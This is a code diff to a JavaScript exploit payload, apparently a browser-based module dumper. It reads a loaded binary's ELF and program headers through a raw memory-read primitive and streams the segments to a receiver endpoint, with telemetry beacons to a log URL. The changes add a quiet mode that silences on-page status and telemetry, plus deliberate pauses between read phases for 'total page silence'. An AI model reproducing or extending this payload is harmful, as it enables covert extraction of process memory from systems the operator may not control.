@@ -37,11 +37,13 @@ window.__DEEPSLOP_PAYLOAD_PROMISE = window.__DEEPSLOP_DUMP_PROMISE = (async () =
     };
     const tel = (m) => {
         try {
+            if (window.__LITE_QUIET_PAYLOAD) return;
             const u = window.__LITE_LOG_URL;
             if (u) fetch(u + encodeURIComponent(String(m).slice(0, 160)), { cache: "no-store" }).catch(function () { });
         } catch (e) { }
     };
     const status = (message) => {
+        if (window.__LITE_QUIET_PAYLOAD) return;
         const box = document.getElementById("dumpStatus");
         if (box) box.textContent = message;
         if (typeof window.setDumpRowStatus === "function" && request.module)
@@ -49,6 +51,7 @@ window.__DEEPSLOP_PAYLOAD_PROMISE = window.__DEEPSLOP_DUMP_PROMISE = (async () =
         log("[DUMP] " + message);
     };
     const setProgress = (percent, sent, total, etaMs, state) => {
+        if (window.__LITE_QUIET_PAYLOAD) return;
         if (typeof window.setDumpProgress === "function")
             window.setDumpProgress(percent, sent, total, etaMs, state);
     };
@@ -176,15 +179,19 @@ window.__DEEPSLOP_PAYLOAD_PROMISE = window.__DEEPSLOP_DUMP_PROMISE = (async () =
         if (typeof fetch !== "function") throw new Error("fetch is unavailable");
         const endpoint = String(request.endpoint || "/__deepslop/dump").replace(/\/$/, "");
         const dumpId = "ds-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 8);
-        status(name + " / " + speedName.toUpperCase() + " / resolving module");
+        if (!window.__LITE_QUIET_PAYLOAD) status(name + " / " + speedName.toUpperCase() + " / resolving module");
+        // 23:26-repro pacing: deliberate pauses between phases, total page silence during reads
+        await sleep(1200);
         tel("PAYLOAD-RESOLVE-BEGIN");
         const module = normalizeModule(await resolveModule(name));
         tel("PAYLOAD-RESOLVED base=" + module.base.toString(16));
+        await sleep(1200);
         const base = module.base;
         const loadBias = module.loadBias;
 
         const header = read(base, 0x40);
         if (!header || header.length !== 0x40) throw new Error("ELF header read failed");
+        await sleep(900);
         const phoff = u64(header, 0x20);
         const phentsize = u16(header, 0x36);
         const phnum = u16(header, 0x38);
@@ -193,10 +200,12 @@ window.__DEEPSLOP_PAYLOAD_PROMISE = window.__DEEPSLOP_DUMP_PROMISE = (async () =
             throw new Error("program-header request exceeds safety bound");
         const phAddress = module.programHeaderAddress;
         const programHeaders = read(phAddress, Number(phBytes));
+        await sleep(900);
         const segments = parseSegments(header, programHeaders, loadBias);
         const total = segments.reduce((sum, segment) => sum + segment.pFilesz, 0);
         if (total > MAX_MODULE) throw new Error("module total exceeds safety bound");
-        status(name + " / " + (preflightOnly ? "PREFLIGHT" : speedName.toUpperCase()) + " / checking receiver");
+        await sleep(1200);
+        if (!window.__LITE_QUIET_PAYLOAD) status(name + " / " + (preflightOnly ? "PREFLIGHT" : speedName.toUpperCase()) + " / checking receiver");
         const receiver = await pingReceiver(endpoint);
         tel("PAYLOAD-PINGED");
 
@@ -300,6 +309,7 @@ window.__DEEPSLOP_PAYLOAD_PROMISE = window.__DEEPSLOP_DUMP_PROMISE = (async () =
         if (typeof window.setDumpRowStatus === "function")
             window.setDumpRowStatus(name, speedName.toUpperCase() + " / complete", "ok");
         out(message);
+        try { if (typeof window.__dsReleaseTransient === "function") window.__dsReleaseTransient(); } catch (e) { }
         return message;
     }
 
@@ -312,6 +322,7 @@ window.__DEEPSLOP_PAYLOAD_PROMISE = window.__DEEPSLOP_DUMP_PROMISE = (async () =
         if (typeof window.setDumpRowStatus === "function" && request.module)
             window.setDumpRowStatus(request.module, "STOPPED", "bad");
         out(message);
+        try { if (typeof window.__dsReleaseTransient === "function") window.__dsReleaseTransient(); } catch (e) { }
         throw error;
     }
 })();
